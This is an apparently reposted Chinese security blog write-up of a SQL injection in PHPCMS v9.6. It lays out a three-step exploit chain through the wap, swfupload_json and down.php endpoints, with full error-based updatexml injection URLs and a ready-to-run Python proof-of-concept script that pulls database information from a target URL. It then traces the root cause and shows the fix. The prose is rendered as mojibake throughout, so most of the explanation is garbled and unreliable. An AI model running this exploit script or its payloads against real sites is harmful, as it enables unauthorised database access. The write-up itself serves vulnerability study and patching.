<meta name="referrer" content="no-referrer"/>
> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tNQxq3A_Pzg2xITYbcJ2zw)

ç¯å¢ƒæ­å»º
----

å‚è€ƒ [PHPCMS_V9.2 ä»»æ„æ–‡ä»¶ä¸Šä¼  getshell æ¼æ´åˆ†æ](https://mp.weixin.qq.com/s?__biz=MzU4NTY4MDEzMw==&mid=2247489053&idx=1&sn=de7468d2e9605a23aab7f21bc1c31ae4&scene=21#wechat_redirect)

æ¼æ´å¤ç°
----

æ­¤æ¼æ´åˆ©ç”¨è¿‡ç¨‹å¯èƒ½ç¨æœ‰å¤æ‚ï¼Œæˆ‘ä»¬å¯åˆ†ä¸ºä»¥ä¸‹ä¸‰ä¸ªæ­¥éª¤ï¼š

*   Step1ï¼šGET è¯·æ±‚è®¿é—®`/index.php?m=wap&c=index&siteid=1`
    

*   è·å–`set-cookie`ä¸­çš„`_siteid`ç»“å°¾çš„ cookie å­—æ®µçš„å€¼
    

*   Step2ï¼š1. POST è¯·æ±‚è®¿é—® `/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao`
    

*   ä¸Šé¢è®¿é—®çš„ url é€šè¿‡ URL è§£ç ä¸ºï¼š`index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=&id=%*27 and updatexml(1,concat(1,(user())),1)#&m=1&modelid=1&catid=1&f=Tao` (æŠ¥é”™æ³¨å…¥ï¼Œè¯­å¥å¯æ›¿æ¢)
    
*   2. å°†`Step1`è·å–`_siteid`ç»“å°¾çš„ cookie å­—æ®µçš„å€¼ï¼Œèµ‹å€¼ç»™ `userid_flash` å˜é‡, ä»¥ post æ•°æ®æäº¤
    
*   è·å–`set-cookie`ä¸­çš„`_json`ç»“å°¾å­—æ®µçš„å€¼
    

*   Step3ï¼šè®¿é—®`/index.php?m=content&c=down&a_k=`step2 è·å–çš„_json ç»“å°¾å­—æ®µçš„å€¼
    

*   egï¼š`/index.php?m=content&c=down&a_k=0e72z-2m8OJyw8injqvbY0xJtR5l5UtndXiFZmxcvK9kHkxN1COlnfyINF38Opx6UcdqlABV2gc-8RuG90sS6e31lJn2mxnkJPnUaQDCTAs0gEsKMnL5CHxl-o1hYg2TWaL5blo9RC8ya0yLkSc5NgzCqfTSgZCAlndhgum-OFk1XGARihPaYUs`
    

Step1ï¼š

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sagVThXZhNia4t5G3l3JFr5RSr50uE55OQiaPg9WyWa8tQcwBZLA9frPtA/640?wx_fmt=png)

Step2ï¼š

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sah3jjqQs1gKWRvGkIoVPLsTdohOe5c4cLQnnIj2gJPTG860BRZIBHhg/640?wx_fmt=png)

Step3ï¼š

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saT5Iv3Dic4j6SVf3bb9jIeODe3EqpT1f7wqqic1iaticFnoMcXj70jbWszg/640?wx_fmt=png)

è€æ ·å­ï¼Œè´´ä¸ªå°è„šæœ¬ï¼

```
'''
Author: Tao
version: python3
# æœ¬è„šæœ¬æ‰§è¡Œè¿”å›user()ä¿¡æ¯
'''
import requests
import sys
# from urllib import parse
import re

def WAP_SQL(url):
Â  Â # step1
Â  Â url_one = url + '/index.php?m=wap&c=index&siteid=1'
Â  Â step1 = requests.get(url_one)
Â  Â userid_flash = step1.headers['Set-Cookie'].split('=')[1]

Â  Â # step2
Â  Â payload = '%*27 and updatexml(1,concat(1,(user())),1)%23&modelid=1&catid=1&m=1&f=Tao'
Â  Â url_two = url + r"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id={}".format(requests.utils.quote(payload))# æ‰§è¡ŒSQLè¯­å¥ï¼Œæ­¤å¤„å¯ä¿®æ”¹
Â  Â step2 = requests.post(url_two, data={'userid_flash': userid_flash})
Â  Â for cookie in step2.cookies:
Â  Â  Â  Â if '_att_json' in cookie.name:
Â  Â  Â  Â  Â  Â att_json = cookie.value

Â  Â # step3
Â  Â url_three = url + '/index.php?m=content&c=down&a_k={}'.format(att_json)
Â  Â step3 = requests.get(url_three)
Â  Â res = re.findall(r"MySQL Error : </b>XPATH syntax error: '(.*?)'",step3.text)
Â  Â return res

if __name__ == '__main__':
Â  Â url = sys.argv[1]
Â  Â result_sql = WAP_SQL(url)
Â  Â print(result_sql)
```

æ‰§è¡Œæ•ˆæœå¦‚ä¸‹ï¼š

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saqEsibRQSOtUIAwplCOjottQribAluz5Ud2am9gm4e7JNund0v1umzXqg/640?wx_fmt=png)

è„šæœ¬åœ¨å¯¹ Stpe2 é‚£é‡Œè¿›è¡Œäº†ä¸æ‰‹å·¥ä¸ä¸€æ ·çš„å¤„ç†ï¼ŒåŸå› å°±æ˜¯æŒ‰ç…§æ‰‹å·¥çš„æ–¹æ³•è¿›è¡Œç¼–å†™çš„è„šæœ¬ä¼šæŠ¥é”™ï¼Œå…·ä½“æ˜¯ä»€ä¹ˆé—®é¢˜ä»¥åŠåŸå› çœ‹æ–‡å°¾çš„åˆ†æã€‚> å€¼å¾—ä¸€çœ‹ï¼ï¼ï¼

æ¼æ´å¤ç°
----

ä¸ºäº†æ›´å¥½çš„ç†è§£è¿™ä¸ªæ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œæˆ‘ä»¬é‡‡å–çš„æ–¹å¼æ˜¯ä»åå¾€å‰åˆ†æã€‚

æ ¹æ® step3 è¯·æ±‚çš„ URL åœ°å€ï¼Œå¯ä»¥å®šä½åˆ°`phpcms\modules\content\down.php`æ–‡ä»¶`init`å‡½æ•°ï¼š

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5safxVYYnDe08e7x9YUwB0ATezbIjy7Ce1hHRjGcOYU8MoRFPL9WotEicA/640?wx_fmt=png)

ä¸Šé¢ä»£ç é€šè¿‡ GET è·å–åˆ°äº†`$a_k`çš„å€¼, ç„¶åå°†`$a_k`å¸¦å…¥`sys_auth`å‡½æ•°è¿›è¡Œè§£å¯†ï¼ˆ`DECODE`ï¼‰, è‡³äºæ˜¯å¦‚ä½•åŠ å¯†çš„ï¼Œæˆ‘ä»¬æ— éœ€å…³å¿ƒï¼Œä½†æ˜¯æˆ‘ä»¬è¦çŸ¥é“çš„æ˜¯`$a_k`çš„å€¼æ˜¯ä»æ‹¿æ¥çš„ï¼Œä¹Ÿå°±æ˜¯ Step2 æ„é€ çš„è¯­å¥æ˜¯å“ªé‡Œè¿›è¡ŒåŠ å¯†å¤„ç†çš„ï¼Œè¿˜æœ‰å°±æ˜¯åŠ å¯†ç”¨çš„ keyã€‚

æ‰§è¡Œåˆ° 17 è¡Œï¼Œæ­¤æ—¶`$a_k={"aid":1,"src":"&id=%27 and updatexml(1,concat(1,(user())),1)#&m=1&modelid=1&catid=1&f=Tao","filename":""}`ï¼Œè¿™é‡Œè¿˜éœ€è¦æ³¨æ„`parse_str`è¿™ä¸ªå‡½æ•°

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saRYIicdZKteu6icyaxiaurS7jg7GiautlG3nhicFkza77Cl4FON0v9gBBElA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saB8jkyd12etm3oOztK0zqYagDicAcrJZoWzWW7aUF7CzPu53ZWbl2r5Q/640?wx_fmt=png)

é€šè¿‡å®˜æ–¹ç»™çš„ä¾‹å­å¯çŸ¥ï¼Œ`parse_str`ä¼šå°†ä¼ å…¥çš„å€¼æ ¹æ®`&`è¿›è¡Œåˆ†å‰²ã€‚ç„¶åè§£ææ³¨å†Œå˜é‡ã€‚å¹¶ä¸”ä¼šå¯¹å†…å®¹è¿›è¡Œ URL è§£ç ã€‚

ä¸ºäº†æ›´å¥½çš„ç†è§£ä¸Šé¢è¿™æ®µè¯ï¼Œçœ‹ä¸‹å›¾ï¼š

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sapNoOjDsfpia3A8We3yGKDwhkBj65GgnSiaViaia2Gv1EFhtKJqoSPjFwyA/640?wx_fmt=png)

ç”±å›¾å¯çŸ¥ï¼Œå½“æ‰§è¡Œ`parse_str`å‡½æ•°ï¼Œä»–ä¼šè¿›è¡Œä»¥ä¸‹æ­¥éª¤ï¼š

*   1. æ ¹æ® & ç¬¦è§£æ`$a_k`çš„å€¼ï¼Œæ³¨å†Œå˜é‡
    
*   2. å°†è§£æåå˜é‡çš„å€¼è¿›è¡Œ URL è§£ç 
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5safy7Ap2hRdib4EAE1kcGPnhEfXnBRHSlcG1lrgGXNCTRUE2uOvib9kibFQ/640?wx_fmt=png)

ç»§ç»­æ‰§è¡Œï¼Œåˆ° 26 è¿›è¡Œäº† SQL è¯­å¥æ‰§è¡Œï¼Œè·Ÿè¿›ä¸€ä¸‹

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sa65xY2xHfPNZHuJQhiajb4nZVeuhwqy84pIIicaMicNn3ewy7NmAiaxtmSA/640?wx_fmt=png)

ä¸Šå›¾å¯çŸ¥ï¼Œæ‰§è¡Œçš„ SQL è¯­å¥å¦‚ä¸‹ï¼š

```
SELECT * FROM `phpcmsv96`.`v9_news_data` WHERE Â `id` = '' and updatexml(1,concat(1,(user())),1)#' LIMIT 1
```

æˆ‘ä»¬å°†è¯­å¥æ”¾åˆ°æ•°æ®åº“æ‰§è¡Œä¸€ä¸‹ã€‚

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saUNf66L7nY9nFYJ3V5lib5lXMGPjpOYXh4Pib3C2NH55GMeuVjtHLyicnQ/640?wx_fmt=png)

æ­£å¸¸è¿”å›äº†ï¼Œä½†å»æ‰`#`ï¼ŒæŠ¥é”™ï¼Œå¦‚ä¸‹å›¾ï¼š

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saLIkkFswpGtzYrobsZ5Q1ib4F4nQFH90N7T4icpVlp0yLwnpEOfmR3M4g/640?wx_fmt=png)

è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ Step2 å¤„ï¼Œæ„é€ çš„ SQL æŠ¥é”™è¯­å¥åé¢æ·»åŠ `#`è¿›è¡Œæ³¨é‡Š

æ¥ä¸‹æ¥åˆ†æ Step2, æˆ‘ä»¬éœ€è¦å¼„æ˜ç™½ï¼Œ`$a_k`çš„å€¼æ˜¯æ€ä¹ˆå¾—åˆ°çš„ï¼Œä»¥åŠä¸ºä»€ä¹ˆ POST è¯·æ±‚æ•°æ®ä¸­éœ€è¦æ·»åŠ `userid_flash`å­—æ®µå’Œå¯¹åº”çš„å€¼æ˜¯æ€ä¹ˆæ¥çš„ã€‚

æ ¹æ® Step2 çš„è¯·æ±‚ï¼Œæˆ‘ä»¬å®šä½åˆ°`/phpcms/modules/attachment/attachments.php`ä¸­`swfupload_json`å‡½æ•°ã€‚

ç”±äº`swfupload_json`æ–¹æ³•æ˜¯`attachments`ç±»ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹çœ‹ç±»ä¸­çš„æ„é€ å‡½æ•°ã€‚ï¼ˆä¸çŸ¥é“ä½ æœ‰æ²¡æœ‰å‘ç°ä»€ä¹ˆï¼‰

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saYH1U6bw4WM7ZiaSR4pyxJoCGals7oewzQjFtGBDic6QvJibJliaLK7YhGQ/640?wx_fmt=png)

ç±»ä¸­çš„æ„é€ å‡½æ•°åˆå§‹åŒ–ä¼šåˆ¤æ–­ï¼ˆ21-23 è¡Œï¼‰æ˜¯å¦æœ‰`$this->userid`ï¼Œé‚£ä¹ˆè¿™ä¸ª`$this->userid`æ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Œ17 è¡Œå¯¹å®ƒè¿›è¡Œäº†èµ‹å€¼

```
$this->userid = $_SESSION['userid'] ? $_SESSION['userid'] : (param::get_cookie('_userid') ? param::get_cookie('_userid') : sys_auth($_POST['userid_flash'],'DECODE'));
```

ä¸Šé¢çš„è¿™ä¸€è¡Œä»£ç ï¼Œé€šè¿‡ä¸‰å…ƒè¿ç®—ç¬¦åˆ¤æ–­`$_SESSION['userid']`æ˜¯å¦æœ‰å€¼ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ­¥åˆ©ç”¨ä¸­ï¼Œè‚¯å®šæ˜¯æ²¡æœ‰å€¼çš„ï¼Œç„¶åæ‰§è¡Œ`(param::get_cookie('_userid')`ï¼Œç„¶åæˆ‘ä»¬ cookie ä¹Ÿæ²¡æœ‰`_userid`ï¼Œæ‰€ä»¥æœ€ç»ˆ`$this->userid = sys_auth($_POST['userid_flash'],'DECODE'));`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sadNYQibo27K9vIXUxDlnr7CM1x0EXv3F2FbO58icTL9dmAtEibNlZQzZSA/640?wx_fmt=png)

`sys_auth($_POST['userid_flash'],'DECODE'))`å°±æ˜¯å¯¹æˆ‘ä»¬ step2 ä¸­`userid_flash`çš„å€¼è¿›è¡Œè§£å¯†, è¿™é‡Œè·Ÿ Step3 è§£å¯†æ˜¯åŒä¸€ä¸ªå‡½æ•°ï¼Œèµ°ä¸‹æ¥ï¼Œ`$this->userid=1`ï¼Œå°±è¿‡äº† 21 è¡Œçš„åˆ¤æ–­ã€‚è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆ POST è¯·æ±‚æ•°æ®ä¸­æ·»åŠ `userid_flash`å­—æ®µã€‚

æ¥ç€åˆ†æ`swfupload_json`æ–¹æ³•

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saibOLO2iaA7XGBA5OUKydIrfFDUkvJrX0iaoZ0FCpFUq3UbHGiaCE08JKwA/640?wx_fmt=png)

è¿™é‡Œé€šè¿‡ GET è¯·æ±‚è·å–äº†`src`çš„å€¼ï¼ˆæŠ¥é”™æ³¨å…¥è¯­å¥ï¼‰ã€‚å¹¶ä¸”ç»è¿‡äº†`safe_replace`å‡½æ•°çš„å¤„ç†ã€‚è·Ÿè¿›ä¸€ä¸‹æ­¤è¿˜èƒ½è¾“ï¼Œçœ‹çœ‹å¦‚ä½•å¤„ç†çš„ã€‚

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saRCh6wBw2jdtcicZ8tfvoBO14kNbKm6OxeDlHHxfE8Y5smj5VE4LsicRg/640?wx_fmt=png)

è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½å°±æ˜¯å¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œå½“ç»è¿‡è¿™ä¸ªå‡½æ•°ï¼Œæœªä½œå¤„ç†`$string`å€¼ä¸º`&id=%*27 and updatexml(1,concat(1,(user())),1)#&m=1&modelid=1&catid=1&f=Tao`ã€‚

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saWaqCKzicLict4vYGmZhjDvZkS6OK86uztQHXORiaiaUQN0TFrroTXCK6wg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saya0nWiaUic0TcPibj8OcITD0KKf2bAhQvXiaypW19iaRBNmaMnf8bdzF5sA/640?wx_fmt=png)

èµ°å®Œä»¥åï¼Œå®ƒå°†æˆ‘ä»¬ä¼ å…¥çš„`%*27`å˜æˆäº†`%27`ã€‚ï¼ˆä¸Šä¸Šå›¾è¿›è¡Œè¿‡æ»¤çš„ï¼‰è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¦åŠ `*`å·

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saxuYOP7kSUOcd4aAO99Og98eBJQibspZEwoAiaPfIu5U5x3DDWTVZLKUA/640?wx_fmt=png)

ç»§ç»­æ‰§è¡Œï¼Œåˆ° 244 è¡Œç”±äº cookie ä¸­æ²¡æœ‰`att_json`ï¼Œæ‰€ä»¥è·³è½¬è‡³ 250 è¡Œè¿›è¡Œè®¾ç½® cookieã€‚

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sanvDKWxF7rpFvoUZLVUkuDCYQicKZjVnd5WtYmncgUwA3yPp4tvM2ZIQ/640?wx_fmt=png)

å¯ä»¥å‘ç°ï¼Œè¿™é‡Œ cookie åŠ å¯†ä¹Ÿæ˜¯ç”¨çš„`sys_auth`å‡½æ•° (è·Ÿ Step3 è§£å¯†ç”¨çš„åŒä¸€ä¸ªå‡½æ•°)ï¼Œè¿™é‡Œçš„ key æœªæŒ‡å®šï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ã€‚

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saIYUbLTo7EzYpq6I8oPYQlTQJKsvktvYFI7UBVbEvPmanBFAEJJNxxA/640?wx_fmt=png)

å›¾ä¸­å¯ä»¥å¾—çŸ¥ï¼Œå½“`key`ä¸ºç©ºæ—¶ï¼Œä½¿ç”¨`pc_base::load_config('system','auth_key')`ã€‚è·Ÿ Step3 ä½¿ç”¨çš„ä¸€è‡´ã€‚

æ¥ç€åˆ†æ Step1

å‰é¢æåˆ°ä¸ºä»€ä¹ˆåŠ `userid_flash`å‚æ•°ï¼Œ`$this->userid = sys_auth($_POST['userid_flash'],'DECODE'));`ï¼Œä¸ºäº†è¿‡æ˜¯å¦ç™»å½•çš„åˆ¤æ–­ã€‚è€Œä¸”è¿™é‡Œä¼ å…¥`userid_flash`çš„å€¼å¿…é¡»æ˜¯åˆæ³•çš„ cookieï¼Œä¹Ÿå°±æ˜¯é€šè¿‡`set_cookie`å‡½æ•°è®¾ç½®çš„ cookieï¼Œè€Œåˆå› `set_cookie`å‡½æ•°è®¾ç½® cookie ä¼šé€šè¿‡`sys_auth`åŠ å¯†ã€‚è¿™æ ·çš„è§£å¯†æ‰æœ‰æ•ˆã€‚

å› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä»å“ªé‡Œæ— æ·»åŠ å³å¯è·å– cookieï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯ wap æ¨¡å—çš„æ¥å£ã€‚åœ¨`phpcms/modules/wap/index.php`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saSVEBCTEMrOkctempSZvyuN5yMXibdTYaQFWEDF61NkZhIWa5uNzL3OA/640?wx_fmt=png)

ä¸Šå›¾ä»£ç å¤„é€šè¿‡ GET è·å–`siteid`çš„å€¼, ç„¶åä¸ºå…¶è®¾ç½® cookieã€‚

æ•´ä¸ªæ¼æ´çš„åˆ©ç”¨æµç¨‹å¦‚ä¸‹ï¼š

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saXibEM8FueUhBKUTvoFl5kyr0iceqAG6N01qWENFDT67ric8Z2BKlgq7LA/640?wx_fmt=png)

æ¼æ´ä¿®å¤
----

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saIibzbSU1HHicOe3KFemibuwrAibcTAgZnS8rtmiaUu6aZXTnzQtju1BYSaQ/640?wx_fmt=png)

å¯¹`$a_k`è¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸”å°†`$id`è¿›è¡Œäº†ç±»å‹è½¬æ¢

å‰é¢æåˆ°é—®é¢˜çš„åˆ†æ
---------

ä¸çŸ¥é“ä½ ä»¬æœ‰æ²¡æœ‰å‘ç°ï¼Œæ‰‹å·¥åˆ©ç”¨è·Ÿè„šæœ¬å®ç°çš„æ—¶å€™ä¸å¤ªä¸€æ ·ï¼ˆè§ä¸‹å›¾ï¼‰

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sarHE3jMCwQaiaSibt1Rw6w3pR5nz5ibq1tibXWJmkvYujfpsnCgRYcmQVBw/640?wx_fmt=png)

æ­£å¸¸æ¥è¯´ï¼Œå› ä¸ºæ‰‹å·¥åˆ©ç”¨çš„æ—¶å€™ç›´æ¥è®¿é—®`/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao`, é‚£ä¹ˆå¯¹åº”è„šæœ¬åº”è¯¥å¦‚ä¸‹å†™ï¼š

```
url_two = url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao"# æ‰§è¡ŒSQLè¯­å¥ï¼Œæ­¤å¤„å¯ä¿®æ”¹
```

ä½†å½“æˆ‘ä»¬è¿™ä¹ˆå†™ï¼Œæ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šæŠ¥é”™ï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sa7aJxsSYOctlxV5eJ2IhWd6Z7WPECGo8fI5aBtiasomDOnJLHv8A53JQ/640?wx_fmt=png)

åˆšå¼€å§‹æˆ‘è¿˜ä»¥ä¸ºæ˜¯ URL å†™é”™äº†ï¼Œåé¢åˆæµ‹äº†ä¸€éã€‚å‘ç°æ‰‹å·¥å¯ä»¥ï¼Œä½†æ˜¯å¸¦åˆ°è„šæœ¬å°±ä¸è¡Œã€‚ç”±äº Step2 æ˜¯æœ¬è„šä¸­æœ€é‡è¦çš„ç¯èŠ‚ï¼Œæˆ‘å°±å¾ˆç¡®åˆ‡çš„å°±æŠŠé—®é¢˜å®šä½åˆ°äº†è¿™é‡Œã€‚æœ€åå®åœ¨æ²¡åŠæ³•äº†ï¼ˆæƒ³ææ‡‚ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼‰ï¼Œè¢« requests è¿™ä¸ªåº“é€¼åˆ°ç»è·¯äº† (è„šæœ¬è¿™ä¸ªé”™æ’äº†å¥½ä¹…çš„ğŸ˜­)ï¼Œäºæ˜¯æˆ‘å°±å»çœ‹äº†ä¸€ä¸‹ requests åº“çš„æºä»£ç ï¼Œçœ‹çœ‹å®ƒå¯¹ url æ˜¯æ€ä¹ˆå¤„ç†çš„ã€‚æœ€ç»ˆå¾—åˆ°çš„ç»“æœå°±æ˜¯ requests åº“å¯¹è¯·æ±‚çš„ url åšäº†`urlencode`ã€‚å½“æˆ‘å¾—åˆ°è¿™ä¸ªç»“è®ºçš„æ—¶å€™ï¼Œå¤§ä½¬å‘Šè¯‰æˆ‘`ä¸encodeæ€ä¹ˆä¼ é€’`ï¼Œæˆ‘ç›´æ¥å¥½å®¶ä¼™ï¼Œå½“æ—¶æˆ‘æ€ä¹ˆå°±æ²¡æƒ³åˆ°è¿™ä¸ªå‘¢ã€‚ä½†åé¢åˆä»”ç»†æƒ³äº†æƒ³ï¼Œåˆ†æè¿™äº›æ¼æ´ï¼Œæ ¹æ®å‰è¾ˆçš„ pocï¼Œå­¦ä¹ è¿™äº›æ‰‹æ³•ï¼Œé‚£ä¹ˆè¿™äº›æ‰‹æ³•å¤§å¤šæ•°ä¸å°±æ˜¯ä¸æŒ‰å¥—è·¯å‡ºç‰Œå˜›ã€‚ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘è‡ªå·±å†è¯´å•¥ï¼Œåæ­£ç„å­¦ã€‚ã€‚ã€‚ï¼‰

è¿›è¡Œ`urlencode`åœ¨ä¸‹å¤„ï¼š

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sab1NljnONbXXvPOVhDZSukPasmQudSKMibzBQG8kInr7ys8hibJ0aIXzA/640?wx_fmt=png)

æ‰§è¡Œçš„æµç¨‹å¦‚ä¸‹ï¼š

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saZ2FeR7XhElZibbgWZ6OKzOLmrIcEsgFEPGeDlnZJiclYgOv1VDkDXTXg/640?wx_fmt=png)

å›å½’æ­£ä¼ ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä»¥ Step2 è¯·æ±‚çš„ url ä¸ºä¾‹ï¼š

```
http://www.phpcms96.com/index.php/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao
```

æ­£å¸¸è¯·æ±‚æ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†å½“ä½¿ç”¨ requests åº“è¯·æ±‚æ—¶ URL å¦‚ä¸‹ï¼š

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saNh7dxa1X8TcibYibHFGsuIx0eJmV9WBbCY02yjg2ISPRLEtJYYQ0u7oA/640?wx_fmt=png)

```
http://www.phpcms96.com/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%2526id=%25*27%2520and%2520updatexml%25281%252Cconcat%25281%252C%2528user%2528%2529%2529%2529%252C1%2529%2523%2526m%253D1%2526modelid%253D1%2526catid%253D1%2526f%253DTao
```

åˆ†æå¦‚ä¸‹å›¾

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5satQx2vhfq2Fhib0W2eZy7eD6rgkTy8ZcI0ALpGIm6TuaJ4RUBdHiaSL6Q/640?wx_fmt=png)

å°±æ˜¯å¯¹æˆ‘ä»¬çš„ url è¿›è¡Œäº†ç¼–ç ï¼Œåˆ°è¿™é‡Œæˆ‘ä»¬ä»…ä»…åªæ˜¯å‘ç°äº†`requests`åº“å¯¹æˆ‘ä»¬çš„ url è¿›è¡Œäº†`encode`ï¼Œä½† php é‚£è¾¹ä¸ºä»€ä¹ˆä¼šæŠ¥é”™æˆ‘ä»¬è¿˜æ²¡æœ‰ææ˜ç™½ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¾—åœ¨ php é‚£è¾¹è¿›è¡Œè°ƒè¯•è§‚å¯Ÿã€‚

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saND3tj134JERicrdqcagibh5aP7mxaunmlstpkEa8xJzAkjr16jAxPYxQ/640?wx_fmt=png)

```
%26id=%27andupdatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao
```

æ¥ç€èµ°åˆ° Step3 çš„ä»£ç ä½ç½®ï¼Œå¯ä»¥å‘ç°`parse_str`æ‰§è¡Œå®Œäº†ï¼Œå¹¶æ²¡æœ‰å¾—åˆ°`$id`å˜é‡ã€‚å‰é¢è¯´åˆ°`parse_str`å‡½æ•°æ˜¯æ ¹æ®`&`ç¬¦è¿›è¡Œè§£ææ³¨å†Œçš„ã€‚ä½†æ˜¯ç”±äºè¿™é‡Œ urlencode å°†æˆ‘ä»¬çš„`&`è¿›è¡Œç¼–ç äº†ï¼Œæ²¡æœ‰è§£ææ³¨å†Œå¯¹åº”çš„å˜é‡ã€‚æ‰€ä»¥æŠ¥äº†ä¸Šé¢çš„å‚æ•°é”™è¯¯ã€‚

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saa70ntFIGZ25u7KLcF41wPo7fY51cTB9YDkWlMMQEiaoYCVLvWShVvvA/640?wx_fmt=png)

